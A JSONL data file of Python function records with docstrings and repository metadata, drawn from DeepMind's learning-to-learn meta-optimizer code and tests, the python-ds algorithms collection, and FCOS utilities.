{"docstring": "\"\"\"Tests second derivatives for simple problem.\"\"\"\n", "func_signal": "def testSecondDerivatives(self):\n", "code": "problem = problems.simple()\noptimizer = meta.MetaOptimizer(net=dict(\n    net=\"CoordinateWiseDeepLSTM\",\n    net_options={\"layers\": ()}))\nminimize_ops = optimizer.meta_minimize(problem, 3,\n                                       second_derivatives=True)\nwith self.test_session() as sess:\n  sess.run(tf.global_variables_initializer())\n  train(sess, minimize_ops, 1, 2)", "path": "learning-to-learn/meta_test.py", "commit_date": "2017-04-07 00:00:00", "repo_name": "google-deepmind/learning-to-learn", "stars": 4062, "license": "apache-2.0", "language": "python", "size": 90}
{"docstring": "\"\"\"Calls func and replaces any trainable variables.\n\nThis returns the output of func, but whenever `get_variable` is called it\nwill replace any trainable variables with the tensors in `variables`, in the\nsame order. Non-trainable variables will re-use any variables already\ncreated.\n\nArgs:\n  func: Function to be called.\n  variables: A list of tensors replacing the trainable variables.\n\nReturns:\n  The return value of func is returned.\n\"\"\"\n", "func_signal": "def _make_with_custom_variables(func, variables):\n", "code": "variables = collections.deque(variables)\n\ndef custom_getter(getter, name, **kwargs):\n  if kwargs[\"trainable\"]:\n    return variables.popleft()\n  else:\n    kwargs[\"reuse\"] = True\n    return getter(name, **kwargs)\n\nreturn _wrap_variable_creation(func, custom_getter)", "path": "learning-to-learn/meta.py", "commit_date": "2017-04-07 00:00:00", "repo_name": "google-deepmind/learning-to-learn", "stars": 4062, "license": "apache-2.0", "language": "python", "size": 90}
{"docstring": "\"\"\"Tests L2L applied to problem with convolutions.\"\"\"\n", "func_signal": "def testConvolutional(self):\n", "code": "kernel_shape = 4\ndef convolutional_problem():\n  conv = snt.Conv2D(output_channels=1,\n                    kernel_shape=kernel_shape,\n                    stride=1,\n                    name=\"conv\")\n  output = conv(tf.random_normal((100, 100, 3, 10)))\n  return tf.reduce_sum(output)\n\nnet_config = {\n    \"conv\": {\n        \"net\": \"KernelDeepLSTM\",\n        \"net_options\": {\n            \"kernel_shape\": [kernel_shape] * 2,\n            \"layers\": (5,)\n        },\n    },\n}\noptimizer = meta.MetaOptimizer(**net_config)\nminimize_ops = optimizer.meta_minimize(\n    convolutional_problem, 3,\n    net_assignments=[(\"conv\", [\"conv/w\"])]\n)\nwith self.test_session() as sess:\n  sess.run(tf.global_variables_initializer())\n  train(sess, minimize_ops, 1, 2)", "path": "learning-to-learn/meta_test.py", "commit_date": "2017-04-07 00:00:00", "repo_name": "google-deepmind/learning-to-learn", "stars": 4062, "license": "apache-2.0", "language": "python", "size": 90}
{"docstring": "\"\"\"While loop body.\"\"\"\n", "func_signal": "def time_step(t, fx_array, x, state):\n", "code": "x_next = list(x)\nstate_next = []\n\nwith tf.name_scope(\"fx\"):\n  fx = _make_with_custom_variables(make_loss, x)\n  fx_array = fx_array.write(t, fx)\n\nwith tf.name_scope(\"dx\"):\n  for subset, key, s_i in zip(subsets, net_keys, state):\n    x_i = [x[j] for j in subset]\n    deltas, s_i_next = update(nets[key], fx, x_i, s_i)\n\n    for idx, j in enumerate(subset):\n      x_next[j] += deltas[idx]\n    state_next.append(s_i_next)\n\nwith tf.name_scope(\"t_next\"):\n  t_next = t + 1\n\nreturn t_next, fx_array, x_next, state_next", "path": "learning-to-learn/meta.py", "commit_date": "2017-04-07 00:00:00", "repo_name": "google-deepmind/learning-to-learn", "stars": 4062, "license": "apache-2.0", "language": "python", "size": 90}
{"docstring": "\"\"\"Provides a custom getter for all variable creations.\"\"\"\n", "func_signal": "def _wrap_variable_creation(func, custom_getter):\n", "code": "original_get_variable = tf.get_variable\ndef custom_get_variable(*args, **kwargs):\n  if hasattr(kwargs, \"custom_getter\"):\n    raise AttributeError(\"Custom getters are not supported for optimizee \"\n                         \"variables.\")\n  return original_get_variable(*args, custom_getter=custom_getter, **kwargs)\n\n# Mock the get_variable method.\nwith mock.patch(\"tensorflow.get_variable\", custom_get_variable):\n  return func()", "path": "learning-to-learn/meta.py", "commit_date": "2017-04-07 00:00:00", "repo_name": "google-deepmind/learning-to-learn", "stars": 4062, "license": "apache-2.0", "language": "python", "size": 90}
{"docstring": "\"\"\"Returns an operator minimizing the meta-loss.\n\nArgs:\n  make_loss: Callable which returns the optimizee loss; note that this\n      should create its ops in the default graph.\n  len_unroll: Number of steps to unroll.\n  learning_rate: Learning rate for the Adam optimizer.\n  **kwargs: keyword arguments forwarded to meta_loss.\n\nReturns:\n  namedtuple containing (step, update, reset, fx, x)\n\"\"\"\n", "func_signal": "def meta_minimize(self, make_loss, len_unroll, learning_rate=0.01, **kwargs):\n", "code": "info = self.meta_loss(make_loss, len_unroll, **kwargs)\noptimizer = tf.train.AdamOptimizer(learning_rate)\nstep = optimizer.minimize(info.loss)\nreturn MetaStep(step, *info[1:])", "path": "learning-to-learn/meta.py", "commit_date": "2017-04-07 00:00:00", "repo_name": "google-deepmind/learning-to-learn", "stars": 4062, "license": "apache-2.0", "language": "python", "size": 90}
{"docstring": "\"\"\"Tests L2L applied to problem with while loop.\"\"\"\n", "func_signal": "def testWhileLoopProblem(self):\n", "code": "def while_loop_problem():\n  x = tf.get_variable(\"x\", shape=[], initializer=tf.ones_initializer())\n\n  # Strange way of squaring the variable.\n  _, x_squared = tf.while_loop(\n      cond=lambda t, _: t < 1,\n      body=lambda t, x: (t + 1, x * x),\n      loop_vars=(0, x),\n      name=\"loop\")\n  return x_squared\n\noptimizer = meta.MetaOptimizer(net=dict(\n    net=\"CoordinateWiseDeepLSTM\",\n    net_options={\"layers\": ()}))\nminimize_ops = optimizer.meta_minimize(while_loop_problem, 3)\nwith self.test_session() as sess:\n  sess.run(tf.global_variables_initializer())\n  train(sess, minimize_ops, 1, 2)", "path": "learning-to-learn/meta_test.py", "commit_date": "2017-04-07 00:00:00", "repo_name": "google-deepmind/learning-to-learn", "stars": 4062, "license": "apache-2.0", "language": "python", "size": 90}
{"docstring": "\"\"\"Tests saving and loading a meta-optimizer.\"\"\"\n", "func_signal": "def testSaveAndLoad(self):\n", "code": "layers = (2, 3)\nnet_options = {\"layers\": layers, \"initializer\": \"zeros\"}\nnum_unrolls = 2\nnum_epochs = 1\n\nproblem = problems.simple()\n\n# Original optimizer.\nwith tf.Graph().as_default() as g1:\n  optimizer = meta.MetaOptimizer(net=dict(\n      net=\"CoordinateWiseDeepLSTM\",\n      net_options=net_options))\n  minimize_ops = optimizer.meta_minimize(problem, 3)\n\nwith self.test_session(graph=g1) as sess:\n  sess.run(tf.global_variables_initializer())\n  train(sess, minimize_ops, 1, 2)\n\n  # Save optimizer.\n  tmp_dir = tempfile.mkdtemp()\n  save_result = optimizer.save(sess, path=tmp_dir)\n  net_path = next(iter(save_result))\n\n  # Retrain original optimizer.\n  cost, x = train(sess, minimize_ops, num_unrolls, num_epochs)\n\n# Load optimizer and retrain in a new session.\nwith tf.Graph().as_default() as g2:\n  optimizer = meta.MetaOptimizer(net=dict(\n      net=\"CoordinateWiseDeepLSTM\",\n      net_options=net_options,\n      net_path=net_path))\n  minimize_ops = optimizer.meta_minimize(problem, 3)\n\nwith self.test_session(graph=g2) as sess:\n  sess.run(tf.global_variables_initializer())\n  cost_loaded, x_loaded = train(sess, minimize_ops, num_unrolls, num_epochs)\n\n# The last cost should be the same.\nself.assertAlmostEqual(cost, cost_loaded, places=3)\nself.assertAlmostEqual(x[0], x_loaded[0], places=3)\n\n# Cleanup.\nos.remove(net_path)\nos.rmdir(tmp_dir)", "path": "learning-to-learn/meta_test.py", "commit_date": "2017-04-07 00:00:00", "repo_name": "google-deepmind/learning-to-learn", "stars": 4062, "license": "apache-2.0", "language": "python", "size": 90}
{"docstring": "\"\"\"Tests L2L applied to simple problem.\"\"\"\n", "func_signal": "def testSimple(self):\n", "code": "problem = problems.simple()\noptimizer = meta.MetaOptimizer(net=dict(\n    net=\"CoordinateWiseDeepLSTM\",\n    net_options={\n        \"layers\": (),\n        # Initializing the network to zeros makes learning more stable.\n        \"initializer\": \"zeros\"\n    }))\nminimize_ops = optimizer.meta_minimize(problem, 20, learning_rate=1e-2)\n# L2L should solve the simple problem is less than 500 epochs.\nwith self.test_session() as sess:\n  sess.run(tf.global_variables_initializer())\n  cost, _ = train(sess, minimize_ops, 500, 5)\nself.assertLess(cost, 1e-5)", "path": "learning-to-learn/convergence_test.py", "commit_date": "2017-02-09 00:00:00", "repo_name": "google-deepmind/learning-to-learn", "stars": 4062, "license": "apache-2.0", "language": "python", "size": 90}
{"docstring": "\"\"\"Returns a nested collection of TensorFlow assign operations.\n\nArgs:\n  ref: Nested collection of TensorFlow variables.\n  value: Values to be assigned to the variables. Must have the same structure\n      as `ref`.\n\nReturns:\n  Nested collection (same structure as `ref`) of TensorFlow assign operations.\n\nRaises:\n  ValueError: If `ref` and `values` have different structures.\n\"\"\"\n", "func_signal": "def _nested_assign(ref, value):\n", "code": "if isinstance(ref, list) or isinstance(ref, tuple):\n  if len(ref) != len(value):\n    raise ValueError(\"ref and value have different lengths.\")\n  result = [_nested_assign(r, v) for r, v in zip(ref, value)]\n  if isinstance(ref, tuple):\n    return tuple(result)\n  return result\nelse:\n  return tf.assign(ref, value)", "path": "learning-to-learn/meta.py", "commit_date": "2017-04-07 00:00:00", "repo_name": "google-deepmind/learning-to-learn", "stars": 4062, "license": "apache-2.0", "language": "python", "size": 90}
{"docstring": "\"\"\"Connects the LogAndSign module into the graph.\n\nArgs:\n  gradients: `Tensor` of gradients with shape `[d_1, ..., d_n]`.\n\nReturns:\n  `Tensor` with shape `[d_1, ..., d_n-1, 2 * d_n]`. The first `d_n` elements\n  along the nth dimension correspond to the log output and the remaining\n  `d_n` elements to the sign output.\n\"\"\"\n", "func_signal": "def _build(self, gradients):\n", "code": "eps = np.finfo(gradients.dtype.as_numpy_dtype).eps\nndims = gradients.get_shape().ndims\n\nlog = tf.log(tf.abs(gradients) + eps)\nclamped_log = Clamp(min_value=-1.0)(log / self._k)  # pylint: disable=not-callable\nsign = Clamp(min_value=-1.0, max_value=1.0)(gradients * np.exp(self._k))  # pylint: disable=not-callable\n\nreturn tf.concat([clamped_log, sign], ndims - 1)", "path": "learning-to-learn/preprocess.py", "commit_date": "2017-04-09 00:00:00", "repo_name": "google-deepmind/learning-to-learn", "stars": 4062, "license": "apache-2.0", "language": "python", "size": 90}
{"docstring": "\"\"\"Creates a MetaOptimizer.\n\nArgs:\n  **kwargs: A set of keyword arguments mapping network identifiers (the\n      keys) to parameters that will be passed to networks.Factory (see docs\n      for more info).  These can be used to assign different optimizee\n      parameters to different optimizers (see net_assignments in the\n      meta_loss method).\n\"\"\"\n", "func_signal": "def __init__(self, **kwargs):\n", "code": "self._nets = None\n\nif not kwargs:\n  # Use a default coordinatewise network if nothing is given. this allows\n  # for no network spec and no assignments.\n  self._config = {\n      \"coordinatewise\": {\n          \"net\": \"CoordinateWiseDeepLSTM\",\n          \"net_options\": {\n              \"layers\": (20, 20),\n              \"preprocess_name\": \"LogAndSign\",\n              \"preprocess_options\": {\"k\": 5},\n              \"scale\": 0.01,\n          }}}\nelse:\n  self._config = kwargs", "path": "learning-to-learn/meta.py", "commit_date": "2017-04-07 00:00:00", "repo_name": "google-deepmind/learning-to-learn", "stars": 4062, "license": "apache-2.0", "language": "python", "size": 90}
{"docstring": "\"\"\"Tests reproducibility of Torch results.\"\"\"\n", "func_signal": "def testResults(self):\n", "code": "problem = problems.simple()\noptimizer = meta.MetaOptimizer(net=dict(\n    net=\"CoordinateWiseDeepLSTM\",\n    net_options={\n        \"layers\": (),\n        \"initializer\": \"zeros\"\n    }))\nminimize_ops = optimizer.meta_minimize(problem, 5)\nwith self.test_session() as sess:\n  sess.run(tf.global_variables_initializer())\n  cost, final_x = train(sess, minimize_ops, 1, 2)\n\n# Torch results\ntorch_cost = 0.7325327\ntorch_final_x = 0.8559\n\nself.assertAlmostEqual(cost, torch_cost, places=4)\nself.assertAlmostEqual(final_x[0], torch_final_x, places=4)", "path": "learning-to-learn/meta_test.py", "commit_date": "2017-04-07 00:00:00", "repo_name": "google-deepmind/learning-to-learn", "stars": 4062, "license": "apache-2.0", "language": "python", "size": 90}
{"docstring": "\"\"\"Parameter and RNN state update.\"\"\"\n", "func_signal": "def update(net, fx, x, state):\n", "code": "with tf.name_scope(\"gradients\"):\n  gradients = tf.gradients(fx, x)\n\n  # Stopping the gradient here corresponds to what was done in the\n  # original L2L NIPS submission. However it looks like things like\n  # BatchNorm, etc. don't support second-derivatives so we still need\n  # this term.\n  if not second_derivatives:\n    gradients = [tf.stop_gradient(g) for g in gradients]\n\nwith tf.name_scope(\"deltas\"):\n  deltas, state_next = zip(*[net(g, s) for g, s in zip(gradients, state)])\n  state_next = list(state_next)\n\nreturn deltas, state_next", "path": "learning-to-learn/meta.py", "commit_date": "2017-04-07 00:00:00", "repo_name": "google-deepmind/learning-to-learn", "stars": 4062, "license": "apache-2.0", "language": "python", "size": 90}
{"docstring": "\"\"\"Returns a nested collection of TensorFlow variables.\n\nArgs:\n  init: Nested collection of TensorFlow initializers.\n  name: Variable name.\n  trainable: Make variables trainable (`False` by default).\n\nReturns:\n  Nested collection (same structure as `init`) of TensorFlow variables.\n\"\"\"\n", "func_signal": "def _nested_variable(init, name=None, trainable=False):\n", "code": "if isinstance(init, list) or isinstance(init, tuple):\n  result = [_nested_variable(i, name, trainable) for i in init]\n  if isinstance(init, tuple):\n    return tuple(result)\n  return result\nelse:\n  return tf.Variable(init, name=name, trainable=trainable)", "path": "learning-to-learn/meta.py", "commit_date": "2017-04-07 00:00:00", "repo_name": "google-deepmind/learning-to-learn", "stars": 4062, "license": "apache-2.0", "language": "python", "size": 90}
{"docstring": "\"\"\"Save meta-optimizer.\"\"\"\n", "func_signal": "def save(self, sess, path=None):\n", "code": "result = {}\nfor k, net in self._nets.items():\n  if path is None:\n    filename = None\n    key = k\n  else:\n    filename = os.path.join(path, \"{}.l2l\".format(k))\n    key = filename\n  net_vars = networks.save(net, sess, filename=filename)\n  result[key] = net_vars\nreturn result", "path": "learning-to-learn/meta.py", "commit_date": "2017-04-07 00:00:00", "repo_name": "google-deepmind/learning-to-learn", "stars": 4062, "license": "apache-2.0", "language": "python", "size": 90}
{"docstring": "# adding node to the source node\n", "func_signal": "def add_edge(self, src, dest):\n", "code": "node = AdjNode(dest)\nnode.next = self.graph[src]\nself.graph[src] = node\n\n# Adding source node to the destination as it is an\n# undirected graph\nnode = AdjNode(src)\nnode.next = self.graph[dest]\nself.graph[dest] = node", "path": "python-ds/data_structures/graphs/adjacency_list.py", "commit_date": "2019-10-20 00:00:00", "repo_name": "prabhupant/python-ds", "stars": 2642, "license": "mit", "language": "python", "size": 616}
{"docstring": "\"\"\"\nLuhn algorithm or Luhn formula is a simple checksum formula\nused to validate a variety of identification numbers, such as\ncredit card numbers, IMEI numbers, National Provider Identifier numbers\nin some of the countries.\n\nIt takes a number as an input\n(Assuming cardnumber as a string)\nand returns true or false\nbased upon whether number is valid or not\n\n:param card_number:\n:return: bool: valid or not\n\nExamples:\n\n>>> check_luhn(\"950123440000\")\nFalse\n>>> check_luhn(\"490154203237518\")\nTrue\n\"\"\"\n", "func_signal": "def check_luhn(card_number):\n", "code": "card_len = len(card_number)\n\ncheck_sum = 0\n\nis_parity = False\n\nfor digit in range(card_len - 1, -1, -1):\n    if is_parity:\n        cal = int(card_number[digit]) * 2\n    else:\n        cal = int(card_number[digit])\n\n    if cal > 9:\n        check_sum += cal - 9\n    else:\n        check_sum += cal\n\n    is_parity = not is_parity\n\nreturn check_sum % 10 == 0", "path": "python-ds/algorithms/miscellaneous/luhn_algorithm.py", "commit_date": "2019-10-12 00:00:00", "repo_name": "prabhupant/python-ds", "stars": 2642, "license": "mit", "language": "python", "size": 616}
{"docstring": "\"\"\"\nThis algorithm convert numbers between any base to any base like:\n\nconvert(\"10\",2,10)\n~> \"2\"\n\nThis function recive 3 parameters\nn -> the number\nfrom_base -> base of n |\nto_base -> base of the result |\nyou can pass the bases as number like base 2 or as string like \"binary\"\n\nWhy the n and the return is an string?\nBecause bases greater the 10 use leathers to represents the numbers\n\"\"\"\n", "func_signal": "def convert(n, from_base, to_base):\n", "code": "n = str(n)\nfrom_base = verify_base(from_base)\nto_base = verify_base(to_base)\n\n# Corner case 0\nif(n == \"0\"):\n    return n\n\nif(n[0] == '-'):\n    n = n[1:]\n    negative = True\nelse:\n    negative = False\n\n# We convert to decimal because is the easy way to convert to all\nmulti = 1\ndecimal_number = 0\nif(from_base == 10):\n    decimal_number = int(n)\nelse:\n    for i in range(len(n) - 1, -1, -1):\n        decimal_number += (multi * decimal_value(n[i]))\n        multi *= from_base\n\nif(to_base == 10):\n    decimal_number = str(decimal_number)\n    if(negative):\n        decimal_number = '-' + decimal_number\n\n    return decimal_number\n\nresult = \"\"\n\nwhile(decimal_number > 0):\n    value = decimal_number % to_base\n    result = to_special_caracter(value) + result\n    decimal_number = int((decimal_number - value)/to_base)\n\nif(negative):\n        result = '-' + result\n\nreturn result", "path": "python-ds/algorithms/math/number_convertion.py", "commit_date": "2020-04-04 00:00:00", "repo_name": "prabhupant/python-ds", "stars": 2642, "license": "mit", "language": "python", "size": 616}
{"docstring": "# Case 1: Not matching length\n", "func_signal": "def check_permutations(word1, word2):\n", "code": "if len(word1) != len(word2):\n    return False\n# Case 2: Both strings have a length of zero\nif len(word1) == 0 and len(word2) == 0:\n    return True\n# Case 3: One Letter Strings\nif len(word1) == 1 and len(word2) == 1:\n    return word1[0] == word2[0]\n# Case 4: Length greater than 1 for both strings and lengths are equal\nelse:\n    populate_letter_count(word1)\n    # Loop through each letter (looping is an O(n) operation)\n    for letter in word2:\n        # Check if it the letter is in the dictionary (checking is O(n) operation)\n        if letter_counts.get(letter) is not None:\n            curr_count = letter_counts.get(letter)\n            if curr_count == 1:\n                letter_counts.pop(letter)\n            else:\n                letter_counts[letter] = curr_count - 1\n        else:\n            return False\n    return True", "path": "python-ds/data_structures/strings/check_permutations.py", "commit_date": "2019-10-09 00:00:00", "repo_name": "prabhupant/python-ds", "stars": 2642, "license": "mit", "language": "python", "size": 616}
{"docstring": "# Loop through each letter (looping is an O(n) operation)\n", "func_signal": "def populate_letter_count(word1):\n", "code": "for letter in word1:\n    # Check if it the letter is in the dictionary (checking is O(n) operation)\n    if letter_counts.get(letter) is None:\n        letter_counts[letter] = 1\n    else:\n        curr_count = letter_counts.get(letter) + 1\n        letter_counts[letter] = curr_count", "path": "python-ds/data_structures/strings/check_permutations.py", "commit_date": "2019-10-09 00:00:00", "repo_name": "prabhupant/python-ds", "stars": 2642, "license": "mit", "language": "python", "size": 616}
{"docstring": "\"\"\"\n:type a: int\n:type b: int\n:rtype: int\n\"\"\"\n\n", "func_signal": "def getSum(a, b):\n", "code": "mask = 0xffffffff\ndiff = 0\ncarry = 0\nwhile b & mask:\n    diff = a ^ b\n    carry = trunc(a & b)\n    carry = carry << 1\n    a = diff\n    b = carry\nif b > 0: return (a & mask)\nelse: return a", "path": "python-ds/algorithms/bit_manipulation/sum_of_two_integers.py", "commit_date": "2020-08-25 00:00:00", "repo_name": "prabhupant/python-ds", "stars": 2642, "license": "mit", "language": "python", "size": 616}
{"docstring": "# Find min and max values\n", "func_signal": "def counting_sort(arr):\n", "code": "min_value = min(arr)\nmax_value = max(arr)\n\n# Count number appearances in the array\ncounting_arr = [0]*(max_value-min_value+1)\nfor num in arr:\n    counting_arr[num-min_value] += 1\n\n# Rearrange sequence in the array\nindex = 0\nfor i, count in enumerate(counting_arr):\n    for _ in range(count):\n        arr[index] = min_value + i\n        index += 1", "path": "python-ds/algorithms/sorting/counting_sort.py", "commit_date": "2020-05-16 00:00:00", "repo_name": "prabhupant/python-ds", "stars": 2642, "license": "mit", "language": "python", "size": 616}
{"docstring": "\"\"\" Find one number in array which is not duplicated,\n    or exsits odd times.\n\"\"\"\n", "func_signal": "def find_odd_number(nums):\n", "code": "s = 0 \nfor n in nums:\n    s ^= n \nreturn s", "path": "python-ds/data_structures/array/find_odd_number.py", "commit_date": "2019-10-27 00:00:00", "repo_name": "prabhupant/python-ds", "stars": 2642, "license": "mit", "language": "python", "size": 616}
{"docstring": "\"\"\"\nGiven a positive integer num, write a function which returns True if num is a perfect square else False.\n\nNote: Do not use any built-in library function such as `sqrt`.\n\n:type num: int\n:rtype: bool\n\"\"\"\n", "func_signal": "def is_perfect_square(num):\n", "code": "i = 0\nwhile i * i < num:\n    i += 1\nif i * i == num:\n    return True\nelse:\n    return False", "path": "python-ds/algorithms/math/perfect_square.py", "commit_date": "2019-10-27 00:00:00", "repo_name": "prabhupant/python-ds", "stars": 2642, "license": "mit", "language": "python", "size": 616}
{"docstring": "\"\"\"\nVerify if already is an integer\nIf is not verify if is in the bases\nIf is not return the default base\n\"\"\"\n", "func_signal": "def verify_base(x):\n", "code": "try:\n    return int(x)\nexcept:\n    if x in bases:\n        return bases[x]\n    else:\n        return default", "path": "python-ds/algorithms/math/number_convertion.py", "commit_date": "2020-04-04 00:00:00", "repo_name": "prabhupant/python-ds", "stars": 2642, "license": "mit", "language": "python", "size": 616}
{"docstring": "\"\"\"\nOptimizes on bubble sort by taking care of already swapped cases\nReference - https://github.com/prabhupant/python-ds/pull/346\n\"\"\"\n", "func_signal": "def bubble_sort_optimized(array):\n", "code": "has_swapped = True\n\nnum_of_iterations = 0\n\nwhile has_swapped:\n    has_swapped = False\n    for i in range(len(array) - num_of_iterations - 1):\n        if array[i] > array[i + 1]:\n            array[i], array[i + 1] = array[i + 1], array[i]\n            has_swapped = True\n    num_of_iterations += 1", "path": "python-ds/algorithms/sorting/bubble_sort.py", "commit_date": "2020-06-20 00:00:00", "repo_name": "prabhupant/python-ds", "stars": 2642, "license": "mit", "language": "python", "size": 616}
{"docstring": "'''\nargs:\nlst: an unsorted array of integers\nitem: data to be found\n\nreturn:\nitem which is found else False\n'''\n", "func_signal": "def front_and_back_search(lst, item):\n", "code": "rear=0\nfront=len(lst)-1\nu=None\nif rear>front:\n    return False\nelse:\n    while rear<=front:\n        if item==lst[rear] or item==lst[front]:\n            u=''\n            return True ##item found\n        elif item!=lst[rear] and item!=lst[front]:\n            if item > lst[rear]:\n                rear=rear+1\n            elif item < lst[front]:\n                front=front-1\n    if u==None:\n        return False", "path": "python-ds/algorithms/miscellaneous/front_and_back_search.py", "commit_date": "2020-04-22 00:00:00", "repo_name": "prabhupant/python-ds", "stars": 2642, "license": "mit", "language": "python", "size": 616}
{"docstring": "#Check if the length of String C is equal to sum of lengths of String A and B\n#In other words, check if String C contains all characters of String A and B\n", "func_signal": "def isInterleaving(string_A, string_B, string_C):\n", "code": "if(len(string_C) != len(string_A) + len(string_B)): return False\n\n#Create an empty array of length of String B\ndp = [None] * (len(string_B) + 1)\n\nfor i in range(len(string_A) + 1):\n    for j in range(len(string_B) + 1):\n        if(i == 0 and j == 0):\n            #The first value of array dp always holds True\n            dp[j] = True\n        elif(i == 0):\n            dp[j] = dp[j - 1] and string_B[j - 1] == string_C[j - 1]\n        elif(j == 0):\n            dp[j] = dp[j] and string_A[i - 1] == string_C[i - 1]\n        else:\n            dp[j] = ((dp[j] and string_A[i - 1] == string_C[i + j - 1]) or (dp[j - 1] and string_B[j - 1] == string_C[i + j - 1]))\n\t\n\t\nreturn dp[len(string_B)]", "path": "python-ds/data_structures/strings/check_interleaving_of_strings.py", "commit_date": "2019-12-01 00:00:00", "repo_name": "prabhupant/python-ds", "stars": 2642, "license": "mit", "language": "python", "size": 616}
{"docstring": "# Get all substrings of string and store them in an empty list\n", "func_signal": "def finding_substrings(string):\n", "code": "    list =[]\n    count=0\n    for i in range(len(string)):\n        for j in range(i+1,(len(string)+1)):\n            list.append(string[i:j])\n\n            count=count+1\n        \n    # printing result  \n    print(list)\n    print(count)", "path": "python-ds/data_structures/strings/finding_all_substrings.py", "commit_date": "2019-10-14 00:00:00", "repo_name": "prabhupant/python-ds", "stars": 2642, "license": "mit", "language": "python", "size": 616}
{"docstring": "\"\"\"\nExamples:\n    >>> gnome_sort([0, 5, 2, 3, 2])\n    [0, 2, 2, 3, 5]\n\n    >>> gnome_sort([])\n    []\n    >>> gnome_sort([-2, -45, -5])\n    [-45, -5, -2]\n\"\"\"\n\n# first case\n", "func_signal": "def gnome_sort(arr):\n", "code": "size = len(arr)\n\nif size <= 1:\n    return arr\nind = 0\n# while loop\nwhile ind < size:\n    if ind == 0:\n        ind += 1\n    elif arr[ind] >= arr[ind - 1]:\n        ind += 1\n    else:\n        # swap\n        temp = arr[ind - 1]\n        arr[ind - 1] = arr[ind]\n        arr[ind] = temp\n        ind -= 1\n\nreturn arr", "path": "python-ds/algorithms/sorting/gnome_sort.py", "commit_date": "2020-06-05 00:00:00", "repo_name": "prabhupant/python-ds", "stars": 2642, "license": "mit", "language": "python", "size": 616}
{"docstring": "# 0 -> color 0\n# 1 -> color 1\n# -1 -> no color assigned\n\n", "func_signal": "def is_bipartite(self, s):\n", "code": "colors = [-1] * self.V\ncolors[s] = 1\n\nqueue = []\nqueue.append(s)\n\nwhile queue:\n    u = queue.pop()\n\n    if self.graph[u][v] == 1: # Check for self loop\n        return False\n    \n    # An edge u to v exists and destination is not \n    # colored\n    for v in range(self.V):\n        if self.graph[u][v] == 1 and colors[v] == -1:\n            colors[v] = 1 - colors[u]\n            queue.append(v)\n\n        elif self.graph[u][v] == 1 and colors[v] == colors[u]:\n            return False\n\nreturn True", "path": "python-ds/data_structures/graphs/bipartite_graph.py", "commit_date": "2020-01-23 00:00:00", "repo_name": "prabhupant/python-ds", "stars": 2642, "license": "mit", "language": "python", "size": 616}
{"docstring": "# Assume the index of the largest element is the root index\n", "func_signal": "def heapify(nums, heap_size, root_index):\n", "code": "largest = root_index\nleft_child = (2 * root_index) + 1\nright_child = (2 * root_index) + 2\n\n# If the left child of the root is a valid index, and the element is greater\n# than the current largest element, then update the largest element\nif left_child < heap_size and nums[left_child] > nums[largest]:\n    largest = left_child\n\n# Do the same for the right child of the root\nif right_child < heap_size and nums[right_child] > nums[largest]:\n    largest = right_child\n\n# If the largest element is no longer the root element, swap them\nif largest != root_index:\n    nums[root_index], nums[largest] = nums[largest], nums[root_index]\n    # Heapify the new root element to ensure it's the largest\n    heapify(nums, heap_size, largest)", "path": "python-ds/algorithms/sorting/heap_sort.py", "commit_date": "2019-10-14 00:00:00", "repo_name": "prabhupant/python-ds", "stars": 2642, "license": "mit", "language": "python", "size": 616}
{"docstring": "\"\"\"\nord(x) is a function that return the number in asc2 table\nwe use ord to get the number of an caracter\n\"\"\"\n# TODO verify if in the base exist the character like:\n# 'z' doesnt exisist in decimal values\n", "func_signal": "def decimal_value(x):\n", "code": "if(x >= '0' and x <= '9'):\n    return int(x)\nelif(x >= 'a' and x <= 'z'):\n    return int(ord(x) - ord('a') + 10)\nelif(x >= 'A' and x <= 'Z'):\n    return int(ord(x) - ord('A') + 10)\nelse:\n    # Error\n    raise Exception('Number not valid for: ', x)", "path": "python-ds/algorithms/math/number_convertion.py", "commit_date": "2020-04-04 00:00:00", "repo_name": "prabhupant/python-ds", "stars": 2642, "license": "mit", "language": "python", "size": 616}
{"docstring": "# length of the previous longest prefix suffix\n", "func_signal": "def long_Prefix_Suffix_Array(pattern, P, long_prefix_suffix):\n", "code": "l=0\nlong_prefix_suffix[0]=0\ni=1\n\n# the loop calculates long_prefix_suffix[i] for i = 1 to P-1\nwhile i < P:\n    if pattern[i] == pattern[l]:\n        l += 1\n        long_prefix_suffix[i] = l\n        i += 1\n    else:\n        if l != 0:\n            l=long_prefix_suffix[l-1]\n        else:\n            long_prefix_suffix[i] = 0\n            i += 1", "path": "python-ds/data_structures/strings/KMP_Pattern_Search.py", "commit_date": "2020-04-28 00:00:00", "repo_name": "prabhupant/python-ds", "stars": 2642, "license": "mit", "language": "python", "size": 616}
{"docstring": "# Can be continuous if \n# 1. Root is none\n# 2. Both left and right STs are none\n# 3. If left ST is none, check for right\n# 4. If right ST is none, check for left\n# 5. Else check for everything\n\n", "func_signal": "def continuous(root):\n", "code": "if root is None:\n    return True\n\nif root.left == None and root.right == None:\n    return True\n\nif root.left == None:\n    return (abs(root.val - root.right.val) == 1) and continuous(root.right)\n\nif root.right == None:\n    return (abs(root.val - root.left.val) == 1) and continuous(root.left)\n\nreturn (abs(root.val - root.right.val) == 1) and (abs(root.left.val - root.val) == 1) and continuous(root.left) and continuous(root.right)", "path": "python-ds/data_structures/binary_trees/continuous_tree.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "prabhupant/python-ds", "stars": 2642, "license": "mit", "language": "python", "size": 616}
{"docstring": "\"\"\"\nSimple function that adds fixed colors depending on the class\n\"\"\"\n", "func_signal": "def compute_colors_for_labels(self, labels):\n", "code": "colors = labels[:, None] * self.palette\ncolors = (colors % 255).numpy().astype(\"uint8\")\nreturn colors", "path": "FCOS/fcos/fcos.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "tianzhi0549/FCOS", "stars": 3225, "license": "other", "language": "python", "size": 8901}
{"docstring": "# used as function call\n", "func_signal": "def register(self, module_name, module=None):\n", "code": "if module is not None:\n    _register_generic(self, module_name, module)\n    return\n\n# used as decorator\ndef register_fn(fn):\n    _register_generic(self, module_name, fn)\n    return fn\n\nreturn register_fn", "path": "FCOS/fcos_core/utils/registry.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "tianzhi0549/FCOS", "stars": 3225, "license": "other", "language": "python", "size": 8901}
